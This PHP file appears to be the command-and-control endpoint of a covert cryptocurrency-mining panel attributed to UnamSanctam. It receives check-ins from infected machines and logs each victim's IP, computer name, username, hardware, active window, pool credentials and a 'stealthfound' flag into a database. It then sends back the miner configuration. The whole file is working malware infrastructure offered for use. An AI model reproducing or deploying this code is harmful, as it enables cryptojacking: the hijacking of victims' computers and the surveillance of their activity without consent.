<?php
/* Made by Unam Sanctam https://github.com/UnamSanctam */
require_once dirname(__DIR__, 1).'/class/class.base.php';
$base = new base();

$base->unam_toggleCustomErrorHandling();

$data = json_decode(file_get_contents('php://input'), true);
if(json_last_error() != JSON_ERROR_NONE) {
    echo "Endpoint is up and running. This page is shown since no data was posted during the request or the data posted was invalid.";
    return;
}

$hostaddress = $_SERVER["REMOTE_ADDR"] ?? '127.0.0.1';
$currentDate = date('Y-m-d H:i:s');

function getData($key){
    global $data;
    return $data[$key] ?? '';
}

$uqhash = substr(md5(getData('computername').getData('cpu')), 0, 16);
$type = getData('type');
$id = getData('id');
$hashrate = round(getData('hashrate') ?: 0.0, 2);

$fields = [
    'ms_ip'=>$hostaddress,
    'ms_status'=>getData('status'),
    'ms_computername'=>getData('computername'),
    'ms_username'=>getData('username'),
    'ms_hashrate'=>$hashrate,
    'ms_pool'=>getData('pool'),
    'ms_port'=>getData('port'),
    'ms_algorithm'=>getData('algo'),
    'ms_password'=>getData('password'),
    'ms_user'=>getData('user'),
    'ms_worker'=>getData('worker'),
    'ms_cpu'=>getData('cpu'),
    'ms_gpu'=>getData('gpu'),
    'ms_activewindow'=>getData('activewindow'),
    'ms_runtime'=>getData('runtime'),
    'ms_version'=>getData('version'),
    'ms_stealthfound'=>getData('stealthfound'),
    'ms_remoteURL'=>getData('remoteconfig'),
    'ms_lastConnection'=>$currentDate
];

getConn()->beginTransaction();
try {
    if (!$base->unam_dbUpdate(getConn(), 'miners', $fields, ['ms_uqhash'=>$uqhash, 'ms_rid'=>$id, 'ms_type'=>$type])) {
        $base->unam_dbInsert(getConn(), 'miners', array_merge(['ms_uqhash'=>$uqhash, 'ms_rid'=>$id, 'ms_type'=>$type, 'ms_config'=>($type == 'xmrig' ? 1 : 2)], $fields));
    }

    $configcon = getConn()->prepare("SELECT cf_data, ms_minerID FROM miners INNER JOIN configs ON ms_config = cf_configID WHERE ms_uqhash = ? AND ms_rid = ? AND ms_type = ?");
    $configcon->execute([$uqhash, $id, $type]);
    $configres = $configcon->fetch(PDO::FETCH_ASSOC);

    if($config['hashrate_history_enable'] && $configres && $configres['ms_minerID']){
        if($config['hashrate_history_limit'] > 0) {
            $cleanhistory = getConn()->prepare("DELETE FROM hashrate WHERE ROWID IN (SELECT ROWID FROM hashrate WHERE hr_minerID = ? ORDER BY ROWID DESC LIMIT -1 OFFSET ?)");
            $cleanhistory->execute([$configres['ms_minerID'], $config['hashrate_history_limit']-1]);
        }
        $addhistory = getConn()->prepare("INSERT INTO hashrate (hr_minerID, hr_algorithm, hr_hashrate, hr_date) VALUES (?, ?, ?, ?)");
        $addhistory->execute([$configres['ms_minerID'], getData('algo'), floor($hashrate), strtotime(date('Y-m-d H:i:00'))]);
    }

    getConn()->commit();
}
catch(PDOException $e) {
    getConn()->rollBack();
}

echo $configres['cf_data'] ?? json_encode(['response'=>'ok']);